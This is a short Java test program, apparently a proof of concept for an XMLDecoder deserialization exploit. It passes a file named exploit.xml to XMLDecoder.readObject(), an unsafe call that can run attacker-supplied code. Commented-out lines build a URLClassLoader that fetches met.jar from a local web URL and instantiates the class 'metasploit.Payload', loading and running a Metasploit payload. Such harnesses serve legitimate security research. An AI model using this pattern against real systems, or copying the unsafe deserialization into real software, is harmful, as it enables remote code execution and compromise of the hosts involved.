import java.io.*;
import java.beans.XMLEncoder;
import java.beans.XMLDecoder;

import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.URL;
import java.net.URLClassLoader;

public class Test {

    public static void main (String[] args) {

        try {
            
            XMLEncoder e = new XMLEncoder(new BufferedOutputStream(new FileOutputStream("Test.xml")));
             // e.writeObject(null);
            e.writeObject(new Object[]{null, new String[0]});
            // e.writeObject(cl);
            e.close();

            XMLDecoder d = new XMLDecoder(new BufferedInputStream(new FileInputStream("exploit.xml")));

            // URLClassLoader cl =  (URLClassLoader) d.readObject();
            // System.out.println(cl);

            // cl =  (URLClassLoader) d.readObject();
            // System.out.println(cl);

            // Class c = (Class) d.readObject();
            // System.out.println(c);
            d.readObject();
            d.close();


            // URLClassLoader cl = new URLClassLoader(new URL[]{new URL("http://localhost/~alvaro/met.jar")});
            // Class c = cl.loadClass("metasploit.Payload");
            // c.newInstance();
            //c.getMethod("main",new Class[]{Class.forName("[Ljava.lang.String;")}).invoke(null,new Object[]{new String[0]});

        } catch (Exception e) {
            e.printStackTrace();
        }

        
    }


}
